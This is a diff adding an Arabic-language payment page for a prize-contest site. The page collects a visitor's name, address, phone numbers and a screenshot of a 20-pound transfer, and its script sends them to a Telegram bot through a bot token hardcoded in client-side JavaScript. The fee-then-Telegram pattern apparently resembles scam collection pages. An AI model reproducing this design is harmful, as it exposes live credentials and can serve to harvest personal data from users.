@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>الدفع | برايز</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+/* منع التحديد */
+*{
+  -webkit-user-select:none;
+  -moz-user-select:none;
+  -ms-user-select:none;
+  user-select:none;
+}
+
+body{
+  font-family:'Cairo',sans-serif;
+  background:#f4f5f7;
+  padding-bottom:95px;
+}
+
+/* ===== HEADER ===== */
+.header{
+  background:#6f4bd8;
+  color:#fff;
+  padding:25px 20px 55px;
+  border-bottom-left-radius:35px;
+  border-bottom-right-radius:35px;
+}
+
+.header h2{
+  font-size:20px;
+  font-weight:900;
+}
+
+/* ===== CONTENT ===== */
+.contests{
+  margin-top:-35px;
+  padding:15px;
+  display:grid;
+  gap:15px;
+}
+
+.card{
+  background:#fff;
+  border-radius:22px;
+  padding:18px;
+  box-shadow:0 10px 25px rgba(0,0,0,.05);
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+}
+
+/* إلغاء أي حركة */
+.card,
+.btn{
+  transition:none !important;
+  transform:none !important;
+}
+
+.card:hover{
+  transform:none !important;
+}
+
+/* ===== PAYMENT FORM ===== */
+.pay-title{
+  font-size:17px;
+  font-weight:900;
+  color:#6f4bd8;
+  margin-bottom:10px;
+}
+
+.pay-label{
+  font-size:13px;
+  font-weight:700;
+  color:#444;
+}
+
+.pay-input{
+  width:100%;
+  padding:13px;
+  border-radius:14px;
+  border:1px solid #ddd;
+  background:#fafafa;
+  font-family:'Cairo',sans-serif;
+  font-size:14px;
+  outline:none;
+}
+
+.pay-input:focus{
+  border-color:#6f4bd8;
+}
+
+.phone-box{
+  position:relative;
+}
+
+.phone-box .wa{
+  position:absolute;
+  left:12px;
+  top:50%;
+  transform:translateY(-50%);
+  font-size:11px;
+  color:#25D366;
+  font-weight:900;
+}
+
+.divider{
+  border:none;
+  height:1px;
+  background:#eee;
+  margin:15px 0;
+}
+
+.transfer-number{
+  background:#f7f6ff;
+  border:1px solid #e5e0ff;
+  color:#6f4bd8;
+  font-weight:900;
+  padding:14px;
+  border-radius:14px;
+  text-align:center;
+  font-size:15px;
+  letter-spacing:1px;
+  cursor:pointer;
+}
+
+/* ===== BUTTON ===== */
+.btn{
+  background:#6f4bd8;
+  color:#fff;
+  border:none;
+  padding:14px;
+  border-radius:14px;
+  font-size:14px;
+  font-weight:900;
+  cursor:pointer;
+}
+
+.btn:disabled{
+  background:#b9aef0;
+  cursor:not-allowed;
+}
+
+.btn:hover:not(:disabled){
+  background:#5a36c6;
+}
+
+/* ===== BOTTOM NAV ===== */
+.bottom-nav{
+  position:fixed;
+  bottom:0;
+  right:0;
+  left:0;
+  background:#fff;
+  border-top:1px solid #eee;
+  display:flex;
+  justify-content:space-around;
+  padding:12px 0 10px;
+  z-index:10;
+  box-shadow:0 -5px 20px rgba(0,0,0,.05);
+}
+
+.nav-item{
+  text-align:center;
+  font-size:11px;
+  color:#999;
+}
+
+.nav-item .circle{
+  width:48px;
+  height:48px;
+  border-radius:16px;
+  background:#f3f3f3;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0 auto 5px;
+}
+
+.nav-item svg{
+  width:22px;
+  height:22px;
+  fill:#888;
+}
+
+.nav-item.active{
+  color:#6f4bd8;
+}
+
+.nav-item.active .circle{
+  background:#6f4bd8;
+}
+
+.nav-item.active svg{
+  fill:#fff;
+}
+
+/* ===== UPLOAD SCREENSHOT ===== */
+.upload-box{
+  display:block;
+  width:100%;
+  cursor:pointer;
+}
+
+.upload-box input{
+  display:none;
+}
+
+.upload-content{
+  border:1.5px dashed #d6d2ff;
+  background:#fafafa;
+  border-radius:14px;
+  padding:18px;
+  text-align:center;
+  font-size:14px;
+  font-weight:700;
+  color:#6f4bd8;
+}
+
+.upload-content span{
+  display:block;
+  margin-top:6px;
+  font-size:11px;
+  font-weight:400;
+  color:#888;
+}
+
+/* ===== ERROR MESSAGES ===== */
+.error-msg{
+  font-size:12px;
+  color:#d93025;
+  margin-top:4px;
+  display:none;
+}
+
+.success-msg{
+  font-size:12px;
+  color:#0f9d58;
+  margin-top:4px;
+  display:none;
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <h2>💳 صفحة الدفع</h2>
+</div>
+
+<!-- PAYMENT -->
+<div class="contests">
+  <div class="card">
+
+    <div class="pay-title">إتمام بيانات الدفع</div>
+
+    <label class="pay-label">الاسم بالكامل</label>
+    <input class="pay-input" id="name" type="text" placeholder="اكتب اسمك">
+    <div class="error-msg" id="error-name">الرجاء إدخال الاسم بالكامل</div>
+
+    <label class="pay-label">العنوان</label>
+    <input class="pay-input" id="address" type="text" placeholder="المحافظة - المركز - القرية">
+    <div class="error-msg" id="error-address">الرجاء إدخال العنوان</div>
+
+    <label class="pay-label">رقم الهاتف (واتساب)</label>
+    <div class="phone-box">
+      <input class="pay-input" id="phone" type="tel" placeholder="01xxxxxxxxx" maxlength="11">
+    </div>
+    <div class="error-msg" id="error-phone">الرجاء إدخال رقم هاتف صحيح (11 رقم)</div>
+
+    <hr class="divider">
+
+    <label class="pay-label">حول على الرقم ده 20 جنيه</label>
+    <div class="transfer-number" id="transfer-number">01012345678</div>
+
+    <label class="pay-label">رقم الهاتف المحول منه</label>
+    <input class="pay-input" id="from-phone" type="tel" placeholder="الرقم اللي تم التحويل منه" maxlength="11">
+    <div class="error-msg" id="error-from-phone">الرجاء إدخال رقم الهاتف المحول منه (11 رقم)</div>
+
+    <label class="pay-label">صورة سكرين شوت التحويل</label>
+<label class="upload-box">
+  <input type="file" id="screenshot" accept="image/*">
+  <div class="upload-content" id="upload-content">
+    📷 اضغط لرفع صورة التحويل
+    <span id="upload-text">PNG - JPG - JPEG</span>
+  </div>
+</label>
+
+    <div class="error-msg" id="error-screenshot">الرجاء رفع صورة التحويل</div>
+
+    <button class="btn" id="submitBtn" disabled>تأكيد الدفع</button>
+    <div class="success-msg" id="success-msg">تم إرسال بياناتك بنجاح!</div>
+
+  </div>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav">
+  <div class="nav-item">
+    <div class="circle">
+      <svg viewBox="0 0 24 24">
+        <path d="M18 2H6v2H3v3c0 3.3 2.7 6 6 6 .6 1.5 1.8 2.7 3.4 3.2V19H8v3h8v-3h-4v-2.8c1.6-.5 2.8-1.7 3.4-3.2 3.3 0 6-2.7 6-6V4h-3V2Z"/>
+      </svg>
+    </div>
+    المسابقات
+  </div>
+
+  <div class="nav-item" onclick="location.href='home.html'">
+    <div class="circle">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 3 2 12h3v8h6v-5h2v5h6v-8h3Z"/>
+      </svg>
+    </div>
+    الرئيسية
+  </div>
+
+  <div class="nav-item active">
+    <div class="circle">
+      <svg viewBox="0 0 24 24">
+        <path d="M19.14 12.94c.04-.3.06-.61.06-.94s-.02-.64-.06-.94l2.03-1.58c.18-.14.23-.41.12-.62l-1.92-3.32c-.11-.21-.36-.3-.58-.22l-2.39.96a7.14 7.14 0 0 0-1.63-.94l-.36-2.54A.5.5 0 0 0 13.9 2h-3.8a.5.5 0 0 0-.49.41l-.36 2.54c-.58.23-1.12.54-1.63.94l-2.39-.96c-.22-.08-.47.01-.58.22L2.73 8.47c-.11.21-.06.48.12.62l2.03 1.58c-.04.3-.06.61-.06.94s.02.64.06.94l-2.03 1.58a.5.5 0 0 0-.12.62l1.92 3.32c.11.21.36.3.58.22l2.39-.96c.51.4 1.05.71 1.63.94l.36 2.54c.05.24.25.41.49.41h3.8c.24 0 .45-.17.49-.41l.36-2.54c.58-.23 1.12-.54 1.63-.94l2.39.96c.22.08.47-.01.58-.22l1.92-3.32a.5.5 0 0 0-.12-.62l-2.03-1.58ZM12 15.5A3.5 3.5 0 1 1 12 8a3.5 3.5 0 0 1 0 7.5Z"/>
+      </svg>
+    </div>
+    الإعدادات
+  </div>
+</div>
+
+<script>
+// تفعيل زر الدفع إذا كل الحقول ممتلئة
+const nameInput = document.getElementById('name');
+const addressInput = document.getElementById('address');
+const phoneInput = document.getElementById('phone');
+const fromPhoneInput = document.getElementById('from-phone');
+const screenshotInput = document.getElementById('screenshot');
+const submitBtn = document.getElementById('submitBtn');
+
+function validateForm(){
+  let valid = true;
+
+  // الاسم
+  if(nameInput.value.trim() === ""){
+    document.getElementById('error-name').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-name').style.display = 'none';
+  }
+
+  // العنوان
+  if(addressInput.value.trim() === ""){
+    document.getElementById('error-address').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-address').style.display = 'none';
+  }
+
+  // رقم الهاتف
+  if(phoneInput.value.trim().length !== 11){
+    document.getElementById('error-phone').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-phone').style.display = 'none';
+  }
+
+  // رقم الهاتف المحول منه
+  if(fromPhoneInput.value.trim().length !== 11){
+    document.getElementById('error-from-phone').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-from-phone').style.display = 'none';
+  }
+
+  // صورة التحويل
+  if(!screenshotInput.files.length){
+    document.getElementById('error-screenshot').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-screenshot').style.display = 'none';
+  }
+
+  submitBtn.disabled = !valid;
+}
+
+// ربط الأحداث
+[nameInput,addressInput,phoneInput,fromPhoneInput,screenshotInput].forEach(el=>{
+  el.addEventListener('input', validateForm);
+  el.addEventListener('change', validateForm);
+});
+
+// نسخ رقم التحويل عند الضغط
+document.getElementById('transfer-number').addEventListener('click', function(){
+  navigator.clipboard.writeText(this.textContent);
+  alert('تم نسخ الرقم!');
+});
+
+// إرسال البيانات + الصورة إلى Telegram
+submitBtn.addEventListener('click', function(e){
+  e.preventDefault();
+
+  const token = "8569960566:AAH2YPW_FXhZIUo1BzL0k3izj5fnuGhiy0k";
+  const chatId = "8562515084";
+
+  const caption = `
+📝 طلب دفع جديد
+------------------
+👤 الاسم: ${nameInput.value}
+📍 العنوان: ${addressInput.value}
+📱 رقم الهاتف: ${phoneInput.value}
+📲 رقم المحول منه: ${fromPhoneInput.value}
+💳 الرقم المحول إليه: ${document.getElementById('transfer-number').textContent}
+`;
+
+  const formData = new FormData();
+  formData.append("chat_id", chatId);
+  formData.append("caption", caption);
+  formData.append("photo", screenshotInput.files[0]);
+
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  })
+  .then(res => {
+    if(res.ok){
+      // عرض رسالة التأكيد
+      const successMsg = document.getElementById('success-msg');
+      successMsg.textContent = "✅ تم تأكيد الدفع وسنتواصل معك قريبًا";
+      successMsg.style.display = 'block';
+
+      submitBtn.disabled = true;
+
+      // إعادة التوجيه بعد 3 ثواني
+      setTimeout(() => {
+        window.location.href = 'home.html';
+      }, 3000);
+    } else {
+      alert("حدث خطأ أثناء إرسال الطلب، حاول مرة أخرى");
+    }
+  });
+});
+
+
+// عرض اسم الصورة بعد اختيارها
+screenshotInput.addEventListener('change', function(){
+  const uploadText = document.getElementById('upload-text');
+  if(this.files.length){
+    uploadText.textContent = `✅ تم اختيار: ${this.files[0].name}`;
+  } else {
+    uploadText.textContent = "PNG - JPG - JPEG";
+  }
+});
+</script>
+
+
+</body>
+</html>
